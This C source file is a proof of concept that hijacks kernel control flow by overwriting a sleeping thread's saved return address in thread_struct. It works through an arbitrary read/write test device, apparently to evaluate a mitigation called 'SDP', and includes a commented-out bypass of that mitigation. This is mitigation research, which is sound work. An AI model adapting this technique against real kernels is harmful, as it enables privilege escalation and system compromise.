// FZY: Control-flow hijacking proof of concept that overwrites the saved ra register in task_struct.thread to redirect a sleeping thread's execution to a kernel function
//   1. Fork a child process
//   2. Child gets its own task_struct address via ioctl, reports it, then sleeps
//   3. Parent overwrites the child's thread_struct.ra with thread_hijack_target
//   4. Parent wakes the child with SIGCONT
//   5. When the child is scheduled, __switch_to restores the hijacked ra
//   6. ret jumps to thread_hijack_target instead of the original return point
//   7. thread_hijack_target calls schedule_tail(prev) to release the rq lock
//      held by __schedule, then calls do_exit(0) to terminate the thread

#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <unistd.h>

struct arb_request {
  unsigned long addr;
  void *data;
  size_t size;
};

#define ARB_READ _IOR('A', 1, struct arb_request)
#define ARB_WRITE _IOW('A', 2, struct arb_request)
#define ARB_GET_CURRENT_TASK _IOR('A', 8, unsigned long)

void arb_read(int fd, unsigned long addr, void *data, size_t size) {
  struct arb_request req = {.addr = addr, .data = data, .size = size};
  if (ioctl(fd, ARB_READ, &req) < 0) {
    perror("arb_read");
    exit(1);
  }
}

void arb_write(int fd, unsigned long addr, void *data, size_t size) {
  struct arb_request req = {.addr = addr, .data = data, .size = size};
  if (ioctl(fd, ARB_WRITE, &req) < 0) {
    perror("arb_write");
    exit(1);
  }
}

int main(int argc, char *argv[]) {
  printf("[+] thread_struct.ra Hijacking PoC\n\n");

  if (argc != 4) {
    printf("Usage: %s <mode> <thread_offset> <target_addr>\n", argv[0]);
    printf("  mode: 0 (no SDP, thread embedded in task_struct)\n");
    printf("        1 (SDP, thread is a pointer in task_struct)\n");
    printf("  thread_offset:\n");
    printf("    mode 0: offset of thread.ra in task_struct\n");
    printf("            pahole -C task_struct vmlinux | grep -A1 'thread_struct.*thread'\n");
    printf("    mode 1: offset of thread pointer in task_struct\n");
    printf("            pahole -C task_struct vmlinux | grep 'thread_struct.*\\*thread'\n");
    printf("  target_addr: nm vmlinux | grep thread_hijack_target\n");
    return 1;
  }

  int mode = atoi(argv[1]);
  unsigned long thread_offset = strtoul(argv[2], NULL, 0);
  unsigned long target_addr = strtoul(argv[3], NULL, 16);

  int fd = open("/dev/arb_rw", O_RDWR);
  if (fd < 0) {
    perror("open /dev/arb_rw");
    return 1;
  }
  printf("[+] Opened /dev/arb_rw\n");

  printf("[+] thread_hijack_target address: 0x%lx\n", target_addr);

  // Pipe for child to report its task_struct address to parent
  int pipefd[2];
  if (pipe(pipefd) < 0) {
    perror("pipe");
    close(fd);
    return 1;
  }

  pid_t child = fork();
  if (child < 0) {
    perror("fork");
    close(fd);
    return 1;
  }

  if (child == 0) {
    // Child process
    close(pipefd[0]);

    int child_fd = open("/dev/arb_rw", O_RDWR);
    if (child_fd < 0) {
      perror("child: open /dev/arb_rw");
      _exit(1);
    }

    unsigned long task_addr;
    if (ioctl(child_fd, ARB_GET_CURRENT_TASK, &task_addr) < 0) {
      perror("child: ARB_GET_CURRENT_TASK");
      close(child_fd);
      _exit(1);
    }
    close(child_fd);

    printf("[child] My task_struct: 0x%lx, pid: %d\n", task_addr, getpid());

    write(pipefd[1], &task_addr, sizeof(task_addr));
    close(pipefd[1]);

    // SIGSTOP puts us to sleep; parent will overwrite our thread.ra then SIGCONT us
    printf("[child] Stopping myself with SIGSTOP...\n");
    kill(getpid(), SIGSTOP);

    // If we reach here, the hijack failed
    printf("[child] Resumed normally after hijack\n");
    _exit(0);
  }

  // Parent process
  close(pipefd[1]);

  int status;
  waitpid(child, &status, WUNTRACED);
  if (!WIFSTOPPED(status)) {
    printf("[-] Child did not stop as expected (status=0x%x)\n", status);
    close(fd);
    return 1;
  }
  printf("[parent] Child stopped (pid=%d)\n", child);

  unsigned long child_task_addr;
  read(pipefd[0], &child_task_addr, sizeof(child_task_addr));
  close(pipefd[0]);
  printf("[parent] Child task_struct: 0x%lx\n", child_task_addr);

  // Locate the ra field in the child's thread_struct
  unsigned long ra_addr;
  if (mode == 0) {
    ra_addr = child_task_addr + thread_offset;
    printf("[parent] Mode 0: ra at task_struct+%lu = 0x%lx\n",
           thread_offset, ra_addr);
  } else {
    unsigned long thread_ptr;
    arb_read(fd, child_task_addr + thread_offset, &thread_ptr, sizeof(thread_ptr));
    printf("[parent] Mode 1: thread pointer at task_struct+%lu: 0x%lx\n",
           thread_offset, thread_ptr);

    printf("[parent] SDP mode: thread pointer (tagged): 0x%lx\n", thread_ptr);
    // FZY: Enable to bypass the mitigation and evaluate if the rest steps work correctly
    // thread_ptr = thread_ptr | 0xFFFF000000000000;

    ra_addr = thread_ptr;
    printf("[parent] thread_struct: 0x%lx, ra at offset 0\n", thread_ptr);
  }

  unsigned long orig_ra;
  arb_read(fd, ra_addr, &orig_ra, sizeof(orig_ra));
  printf("[parent] Original thread.ra: 0x%lx\n", orig_ra);

  // Overwrite ra with thread_hijack_target
  printf("\n[parent] Overwriting thread.ra with thread_hijack_target (0x%lx)...\n",
         target_addr);
  arb_write(fd, ra_addr, &target_addr, sizeof(target_addr));

  unsigned long new_ra;
  arb_read(fd, ra_addr, &new_ra, sizeof(new_ra));
  printf("[parent] New thread.ra: 0x%lx\n", new_ra);

  if (new_ra == target_addr) {
    printf("[parent] Overwrite confirmed!\n");
  } else {
    printf("[parent] WARNING: ra value does not match target (SDP may have blocked it)\n");
  }

  // Wake the child
  printf("\n[parent] Sending SIGCONT to wake child (pid=%d)...\n", child);
  kill(child, SIGCONT);

  waitpid(child, &status, 0);

  if (WIFSIGNALED(status)) {
    printf("[parent] Child killed by signal %d\n", WTERMSIG(status));
  } else if (WIFEXITED(status)) {
    printf("[parent] Child exited with status %d\n", WEXITSTATUS(status));
  }

  printf("\n[+] Check kernel log for hijack result:\n");
  printf("    dmesg | tail -20\n");
  printf("[+] On success, you should see:\n");
  printf("    '*** THREAD RA HIJACK SUCCESS! ***'\n");
  printf("    'thread_hijack_target executing via thread.ra overwrite!'\n");

  close(fd);
  return 0;
}
